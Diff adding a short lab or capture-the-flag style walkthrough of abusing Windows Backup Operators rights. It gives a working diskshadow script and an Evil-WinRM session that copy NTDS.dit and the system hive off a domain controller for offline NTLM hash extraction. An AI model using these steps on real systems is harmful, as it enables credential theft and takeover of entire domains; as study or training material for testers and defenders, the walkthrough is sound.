@@ -1,0 +1,36 @@
+Evil-Winrm
+the user is in the Backup Operators group. There is a known exploitation technique which will abuse these privileges to escalate to the SYSTEM user. 
+
+We can abuse this access to steal the active directory database NTDS.dit to get all the NTLM hashes for all user and computer objects in the domain.
+
+To this end, we can use diskshadow tool to create a shadow copy of the C drive and in the E drive and can copy the NTDS.dit file from this shadow copy to our local system.
+
+In order to exploit this vulnerability, we'll save the following content as script.txt in a file:
+
+cat script.txt
+            
+set verbose onX
+set metadata C:\\Windows\\Temp\\meta.cabX
+set context clientaccessibleX
+set context persistentX
+begin backupX
+add volume C: alias cdriveX
+createX
+expose %cdrive% E:X
+end backupX
+
+Then upload to target:
+*Evil-WinRM* PS C:\Users\jackie\Documents> diskshadow /s script.txt
+
+*Evil-WinRM* PS C:\Users\jackie\Documents> download system
+                                         
+Info: Downloading C:\Users\jackie\Documents\system to system
+ 
+Info: Download successful!
+*Evil-WinRM* PS C:\Users\jackie\Documents> download ntds.dit
+                                         
+Info: Downloading C:\Users\jackie\Documents\ntds.dit to ntds.dit
+ 
+Info: Download successful!
+
+In case evil-winrm's download functionality doesn't work for ntds.dit file due to file size being too large, robocopy can also be used to transfer the file to our Kali box
